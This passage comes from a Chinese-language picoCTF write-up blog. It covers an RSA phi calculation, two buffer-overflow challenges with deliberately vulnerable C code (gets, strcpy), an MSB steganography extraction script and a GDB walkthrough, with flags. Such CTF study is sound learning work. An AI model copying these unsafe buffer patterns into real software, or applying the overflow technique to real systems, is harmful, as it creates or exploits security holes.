stretchy="false">)</mo><mo>×</mo><msubsup><mi>p</mi><mn>2</mn><mrow><msub><mi>k</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo>×</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mn>2</mn></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo>⋯</mo><mo>×</mo><msubsup><mi>p</mi><mi>m</mi><mrow><msub><mi>k</mi><mi>m</mi></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo>×</mo><mo stretchy="false">(</mo><msub><mi>p</mi><mi>m</mi></msub><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n) = p_1^{k_1 - 1} \times (p_1 - 1) \times p_2^{k_2 - 1} \times (p_2 - 1) \times \cdots \times p_m^{k_m - 1} \times (p_m - 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1973em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1973em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0961em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>這樣求出來 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 後就可以用正常計算流程找到明文 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 了。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;too_many_fact0rs_8606199&#125;</span><br></pre></td></tr></table></figure><h1 id="Pwn-Binary-Exploitation">Pwn (Binary Exploitation)</h1><h2 id="Local-Target">Local Target</h2><p>這題給了一個可執行的檔案和 C 語言的代碼，先來分析一下他的代碼吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *fptr;</span><br><span class="line">  <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> input[<span class="number">16</span>];</span><br><span class="line">  <span class="type">int</span> num = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a string: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(input);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;num is %d\n&quot;</span>, num);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (num == <span class="number">65</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You win!\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="comment">// Open file</span></span><br><span class="line">    fptr = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fptr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Cannot open file.\n&quot;</span>);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read contents from file</span></span><br><span class="line">    c = fgetc(fptr);</span><br><span class="line">    <span class="keyword">while</span> (c != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c);</span><br><span class="line">      c = fgetc(fptr);</span><br><span class="line">    &#125;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fclose(fptr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>當使用 Netcat 連線到題目的時候，會如同下面一般。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701161031231.png" alt="題目"></p><p><strong>分析代碼</strong></p><ol><li><code>char input[16];</code>宣告了一個長度為 16 的字元陣列，儲存使用者輸入。</li><li><code>gets(input);</code>獲取使用者輸入，由於<code>gets</code>函數不檢查輸入的長度，使用者可以輸入超過 16 個字元。（<a href="https://blog.csdn.net/qq_40907279/article/details/89046366">危险函数 gets()几种完美的替代方法 你可能还不知道的</a>）</li><li><code>int num = 64;</code>宣告並初始化變數<code>num</code>。</li><li>拿到 flag 的條件是要讓 num 的值為 65。</li></ol><p>這邊我們可以用<code>man gets</code>指令進入 gets 的 man 手冊頁，看一下他的 bug 區塊，了解 gets 到底危險在哪裡。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702142351553.png" alt="Bug of gets function"></p><p><strong>BOF 攻擊</strong></p><p>首先，先檢查一下他有沒有任何保護機制。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701171059944.png" alt="Checksec from pwntools"></p><p>他沒有 <a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">Canary</a> 也沒有 <a href="https://ithelp.ithome.com.tw/articles/10336777">PIE</a>，就正常做 BOF 就可以了。</p><p>因為<code>input</code>和<code>num</code>都是區域變數，所以會存在 Stack 中。並且因為是先宣告<code>input</code>緊接著宣告<code>num</code>，所以在 Stack 中會像下面這樣：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">High Address</span><br><span class="line">|</span><br><span class="line">|---------------------|</span><br><span class="line">|  Return Address     | &lt;-- top</span><br><span class="line">|---------------------|</span><br><span class="line">|  Frame Pointer      |</span><br><span class="line">|---------------------|</span><br><span class="line">|  int num            | &lt;-- 4 Bytes</span><br><span class="line">|---------------------|</span><br><span class="line">|  char input[16]     | &lt;-- 16 Bytes</span><br><span class="line">|---------------------|</span><br><span class="line">|</span><br><span class="line">Low Address</span><br></pre></td></tr></table></figure><p>最後試出來的 Payload 是 24 個字元加上一個大寫的 A（因為<code>ord(A) == 65</code>），但是在這裡我有點不理解為甚麼前面是 24 個填充，猜測是<code>input[16]</code>跟<code>num</code>中間有 Padding 之類的東西。如果有人知道的話再麻煩跟我解釋一下，感謝了！總之，還是拿到 Flag 啦。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704141242017.png" alt="Flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;l0c4l5_1n_5c0p3_fee8ef05&#125;</span><br></pre></td></tr></table></figure><h2 id="buffer-overflow-0">buffer overflow 0</h2><p>這題也是給了可執行文件和源代碼，先下載下來看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);  <span class="comment">// 這裡會print出flag</span></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">16</span>];  <span class="comment">// 這裡是關鍵。函數的名稱vuln代表著vulnerability</span></span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">           <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fgets(flag, FLAGSIZE_MAX, f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler); <span class="comment">// Set up signal handler 當運行時出現Signal: SIGSEGV (Segmentation fault)時會調用sigsegv_handler函數</span></span><br><span class="line"></span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">  gets(buf1);</span><br><span class="line">  vuln(buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The program will exit now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析代碼</strong></p><ol><li>Winning condition 是要觸發 Segmentation fault。</li><li><code>vuln</code>函式裡面的<code>buf2</code>宣告為 16 個字元的大小，也就是 16 個 Bytes。</li><li>當<code>gets</code>輸入的內容超過 16 個 Bytes 的時候，觸發錯誤。</li></ol><p>這邊我們可以再來看一下除了<code>gets</code>以外的危險函式，也就是<code>strcpy</code>。（<a href="https://security.stackexchange.com/questions/202358/buffer-overflow-example-strcpy">Buffer Overflow example - strcpy</a>）</p><p>man 手冊裡面也寫了，程式設計師要負起責任，指派一個足夠大的空間給 strcpy 的 dst（Destination）。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702145932067.png" alt="Manual page for strcpy"></p><p><strong>BOF 攻擊</strong></p><p>所以我們知道，在這裡只要輸入很長的字串，就會造成<code>strcpy</code>出錯，並得到 flag，那就來試試看吧！</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240702150413588.png" alt="Flag"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;ov3rfl0ws_ar3nt_that_bad_9f2364bc&#125;</span><br></pre></td></tr></table></figure><h2 id="buffer-overflow-1">buffer overflow 1</h2><p>老樣子，一個 ELF 檔案，一個源碼。</p><h1 id="Forensics">Forensics</h1><h2 id="MSB">MSB</h2><p>看這個題目名稱，然後又出現在 Forensics，應該是跟隱寫術有關了。如果你還不知道 LSB 和 MSB 都是個啥，可以先去看看 <a href="https://cx330.tw/Notebooks/Cryptography-Notebook-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/">Cryptography Notes 密碼學任督二脈</a>，裡面有解釋了甚麼是 LSB 和 MSB。</p><p>題目的題幹說，This image passes LSB statistical analysis。那相反的，它其實就是在暗示 flag 可能藏在 RGB 像素值的 MSB 中，所以就來提取它每個像素中的的 MSB 吧。這邊用到了 Python 中的 Pillow 這個庫，如果覺得太麻煩，也可以直接用這個現成的工具 <a href="https://github.com/zardus/ctf-tools/tree/master/stegsolve">Stegsolve</a>。</p><p>Exploit 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_msb</span>(<span class="params">image_path</span>):</span><br><span class="line">    image = Image.<span class="built_in">open</span>(image_path)</span><br><span class="line">    pixels = image.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 獲取圖片尺寸</span></span><br><span class="line">    width, height = image.size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化儲存提取自MSB的字串</span></span><br><span class="line">    msb_data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取每個像素的MSB</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            r, g, b = pixels[x, y]</span><br><span class="line">            <span class="comment"># AND運算只保留了r, g, b的最高位，後面清零，再右移7位</span></span><br><span class="line">            msb_data += <span class="built_in">str</span>((r &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            msb_data += <span class="built_in">str</span>((g &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line">            msb_data += <span class="built_in">str</span>((b &amp; <span class="number">0b10000000</span>) &gt;&gt; <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 將提取的MSB每8個位元轉換成字元</span></span><br><span class="line">    hidden_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msb_data), <span class="number">8</span>):</span><br><span class="line">        byte = msb_data[i : i + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">8</span>:</span><br><span class="line">            hidden_text += <span class="built_in">chr</span>(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hidden_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_pico_ctf</span>(<span class="params">data</span>):</span><br><span class="line">    pattern = <span class="string">r&quot;picoCTF\&#123;.*?\&#125;&quot;</span></span><br><span class="line">    matches = re.findall(pattern, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> matches:</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found: <span class="subst">&#123;<span class="keyword">match</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No matches found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    image_path = (</span><br><span class="line">        <span class="string">&quot;MSB/Ninja-and-Prince-Genji-Ukiyoe-Utagawa-Kunisada.flag.png&quot;</span>  <span class="comment"># 替換為你的路徑</span></span><br><span class="line">    )</span><br><span class="line">    hidden_message = extract_msb(image_path)</span><br><span class="line">    find_pico_ctf(hidden_message)</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;15_y0ur_que57_qu1x071c_0r_h3r01c_ea7deb4c&#125;</span><br></pre></td></tr></table></figure><h1 id="Reverse">Reverse</h1><h2 id="GDB-Test-Drive">GDB Test Drive</h2><p>這題的話先用<code>wget</code>把題目這個二進制檔案抓下來。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701212911463.png" alt="Wget"></p><p>然後後面的步驟基本上就照著題目給的指令一步一步來就可以了。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213346170.png" alt="Instructions"></p><p>這邊來稍微解釋一下每個指令的意義，他到底是做了哪些事情呢？</p><ul><li><code>chmod +x gdbme</code><ul><li>修改 gdbme 檔案的權限，新增執行權限（x）</li></ul></li><li><code>gdb gdbme</code><ul><li>使用 gdb（GNU Debugger）打開 gdbme 這個可執行檔案。</li></ul></li><li><code>layout asm</code><ul><li>啟用組合語言（Assembly, ASM）視圖</li></ul></li><li><code>break *(main+99)</code><ul><li>在 main 函數開始偏移 99 的位元組的地方設置斷點（Breakpoint）。</li></ul></li><li><code>jump *(main+104)</code><ul><li>跳到 main 函數開始偏移 104 位元組的地方繼續執行。</li></ul></li></ul><p>至於這邊為甚麼要在 main+99 的地方設定斷點，是因為這裡他調用了一個函式叫做<code>sleep</code>，所以當我們直接執行 gdbme 的時候會進入到<strong>sleep</strong>的狀態，讓我們以為這個程式沒有做任何事。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/H1IxfrlvA.png" alt="Sleep function"></p><p>所以在這邊我們才要把斷點設在 main+99，讓他執行到這邊的時候暫停一下，然後我們直接使用 jump 叫到下面一個地方，也就是 main+104 繼續執行。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240701213211218.png" alt="Flag"></p><p>這樣就得到 flag 啦。</p><figure class="highlight 